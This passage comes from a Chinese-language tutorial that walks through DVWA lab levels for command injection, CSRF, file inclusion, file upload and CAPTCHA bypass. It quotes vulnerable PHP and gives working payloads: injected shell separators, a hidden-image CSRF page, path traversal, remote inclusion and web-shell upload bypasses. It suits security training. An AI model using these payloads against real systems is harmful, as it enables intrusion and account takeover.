</code></pre><p>相比Low级别的代码，服务器端对ip参数做了一定过滤，即把”&amp;&amp;” 、”;”删除，本质上采用的是黑名单机制，因此依旧存在安全问题。<br>漏洞利用</p><p>127.0.0.1&amp;net user<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240149_886.png" alt=""></p><blockquote><p>这里需要注意的是”&amp;&amp;”与” &amp;”的区别：</p><p>Command 1&amp;&amp;Command 2</p><p>先执行Command 1，执行成功后执行Command 2，否则不执行Command 2</p><p>Command 1&amp;&amp;Command 2</p><p>Command 1&amp;Command 2</p><p>先执行Command 1，不管是否成功，都会执行Command 2</p></blockquote><p>2、由于使用的是str_replace把”&amp;&amp;” 、”;”替换为空字符，因此可以采用以下方式绕过：</p><p>127.0.0.1&amp;;&amp;ipconfig</p><p>127.0.0.1&amp;;&amp;ipconfig 绕过 </p><p>这是因为”127.0.0.1&amp;;&amp;ipconfig”中的” ;”会被替换为空字符，这样一来就变成了”127.0.0.1&amp;&amp; ipconfig” ，会成功执行。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240151_333.png" alt=""></p><p>High：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Get input $target = trim($_REQUEST[ &#39;ip&#39; ]); // Set blacklist $substitutions = array( &#39;&amp;&#39;  =&gt; &#39;&#39;, &#39;;&#39;  =&gt; &#39;&#39;, &#39;|  &#39; =&gt; &#39;&#39;, &#39;-&#39;  =&gt; &#39;&#39;, &#39;$&#39;  =&gt; &#39;&#39;, &#39;(&#39;  =&gt; &#39;&#39;, &#39;)&#39;  =&gt; &#39;&#39;, &#39;`&#39;  =&gt; &#39;&#39;, &#39;||&#39; =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping  &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt;</code></pre><p>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。</p><p>127.0.0.1|net user</p><p>127.0.0.1|net user 利用</p><p>Command 1 | Command 2</p><p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p><p>Impossible：</p><p>不存在命令注入漏洞</p><p><a href="http://www.4hou.com/technology/1012.html" target="_blank" rel="external">使用Metasploit对DVWA进行命令注入攻击</a></p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $target = $_REQUEST[ &#39;ip&#39; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int&#39;s put the IP back together. $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping  &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } else { // Ops. Let the user name theres a mistake echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; </code></pre><h3 id="四：CSRF"><a href="#四：CSRF" class="headerlink" title="四：CSRF"></a>四：CSRF</h3><p>Cross-Site Request Forgery，跨站请求伪造，也称为One Click Attack，或者Session Riding。</p><p>是一种对网站的恶意利用。CSRF通过伪装来自受信任用户的请求来利用受信任的网站。</p><p>XSS与之相反，XSS利用站点内的信任用户进行攻击。</p><p>举个例子</p><p>下面这幅图片应该比较形象了，用户浏览器在不知情的情况下访问了A网站。并且A网站是可以正常访问的，因为Cookie并没有失效。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240200_145.jpg" alt=""><br>再举个实际中可能发生的例子</p><p>一个网站用户Bob可能正在浏览聊天论坛，而同时另一个用户Alice也在此论坛中，并且后者刚刚发布了一个具有Bob银行链接的图片消息。设想一下，Alice编写了一个在Bob的银行站点上进行取款的form提交的链接，并将此链接作为图片tag。如果Bob的银行在cookie中保存他的授权信息，并且此cookie没有过期，那么当Bob的浏览器尝试装载图片时将提交这个取款form和他的cookie，这样在没经Bob同意的情况下便授权了这次事务。</p><p>这个例子是上面的英文版描述。改变配置、强制提交信息、取消会员等危害。</p><p>CSRF是一种依赖web浏览器的、被混淆过的代理人攻击（deputy attack）</p><pre><code>CSRF攻击依赖下面的假定：1 攻击者了解受害者所在的站点2 攻击者的目标站点具有持久化授权cookie或者受害者具有当前会话cookie3 目标站点没有对用户在网站行为的第二授权</code></pre><p>low：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Get input $pass_new  = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt;</code></pre><p>代码中在获取了$pass_new和$pass_conf这两个变量之后，利用mysql_real_escape_string()函数进行了过滤，这样虽然可以防止SQL注入，但却无法阻止CSRF攻击，之后这两个变量便被直接代入UPDATE语句中执行了数据库更新操作。</p><blockquote><p>服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制</p></blockquote><p>CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p><p>漏洞利用</p><p>1.<br><a href="http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#" target="_blank" rel="external">http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a><br>当受害者点击了这个链接，他的密码就会被改成password</p><p>2.构造攻击页面</p><p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。</p><pre><code>&lt;img src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt;</code></pre><p>当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack</p><p>Medium：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Checks to see where the request came from if( eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ] ) ) { // Get input $pass_new  = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } } else { // Didn&#39;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt; </code></pre><p>可以看到这里在获取$pass_new和$pass_conf这两个变量之前，先利用一个if语句来判断“$_SERVER[‘HTTP_REFERER’]”的值是否是127.0.0.1。这是一种基本的防御CSRF攻击的方法：验证HTTP Referer字段。我们可以再次使用之前的方法来实施CSRF攻击，可以发现已经不起作用了。下面就来解释一下这种防御方法的原理。</p><p>根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。比如下面这个利用Burpsuite拦截到的数据包，数据要提交到的页面是upfile_Other.asp，而我们是通过Referer字段后的<a href="http://192168.80.131/upload_Other.asp这个页面发起的请求。" target="_blank" rel="external">http://192168.80.131/upload_Other.asp这个页面发起的请求。</a></p><blockquote><p>根据Referer验证请求来源，绕过思路：在HTTP请求头声明Referer。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240213_708.png" alt=""></p></blockquote><p>High：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $pass_new  = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p>这里需要管理员首先输入当前密码，然后才能重新设置密码。这就是目前非常有效的一种防御CSRF攻击的方法：二次确认。<br>不会</p><p>impossible：</p><p>Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p><hr><h3 id="五：文件包含漏洞"><a href="#五：文件包含漏洞" class="headerlink" title="五：文件包含漏洞"></a>五：文件包含漏洞</h3><p>文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。<br>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。<br>常见包含函数有：include()、require()<br>区别：</p><pre><code>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</code></pre><p>require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件<br>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</p><p>low：</p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];?&gt; </code></pre><p>URL可发现，注入点在page，low等级直接注入<br><a href="http://192.168.67.22/dvwa/vulnerabilities/fi/?page=/etc/profile" target="_blank" rel="external">http://192.168.67.22/dvwa/vulnerabilities/fi/?page=/etc/profile</a><br>报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241240_986.png" alt=""><br>payload：<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini</a><br>成功进入服务器的php.ini文件<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241247_240.png" alt=""></p><p>构造url（相对路径）</p><pre><code>http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=..\..\..\..\..\..\..\..\..\phpStudy\WWW\DVWA-1.9\php.ini</code></pre><p>2.远程文件包含</p><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><p>在远程服务器192.168.5.12上传一个phpinfo.txt文件.<br>构造url</p><pre><code>http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=http://192.168.5.12/phpinfo.txt</code></pre><p>Medium:</p><p>&lt;php</p><p>//Thepagewewishtodisplay<br>$file=$_GET[‘page’];</p><p>//Inputvalidation<br>$file=str_replace(array(“<a href="http://&quot;,&quot;https://&quot;),&quot;&quot;,$file" target="_blank" rel="external">http://&quot;,&quot;https://&quot;),&quot;&quot;,$file</a>);<br>$file=str_replace(array(“../“,”..\””),””,$file);</p><p>&gt;</p><p>Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”<a href="https://”、" target="_blank" rel="external">https://”、</a> ” ../”、”..\”替换为空字符。</p><p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。<br>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p><p>paylaod:<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini</a></p><p>远程文件包含:<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=htthttp://p://192.168.5.12/phpinfo.txt" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=htthttp://p://192.168.5.12/phpinfo.txt</a></p><p>High:</p><pre><code>&lt;php//Thepagewewishtodisplay$file=$_GET[&#39;page&#39;];//Inputvalidationif(!fnmatch(&quot;file*&quot;,$file)&amp;&amp;$file!=&quot;include.php&quot;){   //Thisisn&#39;tthepagewewant!echo&quot;ERROR:Filenotfound!&quot;;exit;}&gt;</code></pre><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p><p>思路：利用file协议绕过防护策略。<br>payload：<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=file:///D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=file:///D:\phpStudy\WWW\DVWA-1.9\php.ini</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201710241306_740.png" alt=""><br>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p><p>Impossible：</p><pre><code>&lt;php//Thepagewewishtodisplay$file=$_GET[&#39;page&#39;];//Onlyallowinclude.phporfile{1..3}.phpif($file!=&quot;include.php&quot;&amp;&amp;$file!=&quot;file1.php&quot;&amp;&amp;$file!=&quot;file2.php&quot;&amp;&amp;$file!=&quot;file3.php&quot;){//Thisisn&#39;tthepagewewant!echo&quot;ERROR:Filenotfound!&quot;;exit;}&gt;</code></pre><p>Impossible级别的代码使用了白名单机制进行防护，白名单算是目前最有效的防过滤手段。</p><p>柠檬师傅的总结：<br><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">文件包含漏洞小结</a></p><h3 id="五：File-Upload"><a href="#五：File-Upload" class="headerlink" title="五：File Upload"></a>五：File Upload</h3><p>文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241313_324.png" alt=""></p><p>Low：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; </code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710241319_392.png" alt=""><br>连接菜刀getshell~<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241336_64.png" alt=""><br>Medium：</p><p>&lt;?php </p><pre><code>if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } ?&gt;</code></pre><p>查看源码，可发现代码限制了MIME类型和文件大小<br>if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp; ( $uploaded_size &lt; 100000 ) )<br>绕过思路，改一下MIME类型即可。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241343_499.png" alt=""><br>上传cmd.jpg文件，抓包。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241344_12.png" alt=""><br>尝试修改filename为hack.php。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241345_547.png" alt=""><br>上菜刀得到shell~</p><p>截断绕过规则</p><p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png。</p><p>可以看到，包中的文件类型为image/png，可以通过文件类型检查。</p><p>High：</p><pre><code>    &lt;?php     if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );     // File information     $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1);     $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];     // Is it an image?     if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;     ( $uploaded_size &lt; 100000 ) &amp;&amp;     getimagesize( $uploaded_tmp ) ) {     // Can we move the file to the upload folder?     if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {     // No     echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;     }     else {     // Yes!     echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;     }     }     else {     // Invalid file     echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     }     }     ?&gt;</code></pre><p>可发现代码限制了后缀名，文件大小和用getimagesize检查文件头并判断文件大小</p><pre><code>&gt; // Is it an image? &gt; if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) )</code></pre><p>strrpos(string,find,start)</p><p>函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。</p><p>getimagesize(string filename)</p><p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p><p>可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”<em>.jpg”、”</em>.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。</p><p>绕过思路：shell的后缀名改为jpg/jpeg/png，文件头插入jpg/png/gif的头部信息绕过getimagesize，<br>首先利用copy将一句话木马文件cmd.php与图片文件1.jpg合并Piccmd.jpg<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241425_841.png" alt=""></p><p>上菜刀得到shell</p><p>Impossible：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; // Where are we going to be writing to? $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;; //$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;; $target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; $temp_file = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) ); $temp_file.= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &#39;image/jpeg&#39; ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo &quot;&lt;pre&gt;&lt;a href=&#39;${target_path}${target_file}&#39;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; } else { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>该级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><h3 id="七：Insecure-CAPTCHA"><a href="#七：Insecure-CAPTCHA" class="headerlink" title="七：Insecure CAPTCHA"></a>七：Insecure CAPTCHA</h3><p>reCAPTCHA验证流程</p><p>这一模块的验证码使用的是Google提供reCAPTCHA服务，下图是验证的具体流程。<br><img src="http://oy0tigw51.bkt.clouddn.com/201710241444_780.jpg" alt=""></p><p>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。</p><p>recaptcha_check_answer($privkey,$remoteip, $challenge,$response)</p><p>low：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_SERVER[ &#39;REMOTE_ADDR&#39; ], $_POST[ &#39;recaptcha_challenge_field&#39; ], $_POST[ &#39;recaptcha_response_field&#39; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { // Show next stage for the user echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;{$pass_new}\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;{$pass_conf}\&quot; /&gt; &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; &lt;/form&gt;&quot;; } else { // Both new passwords do not match. $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check to see if both password match if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the end user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with the passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } mysql_close(); } ?&gt;</code></pre><p>通过构造参数绕过验证过程的第一步<br>首先输入密码，点击Change按钮，抓包，更改step参数=2绕过验证码</p><p>Medium：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check 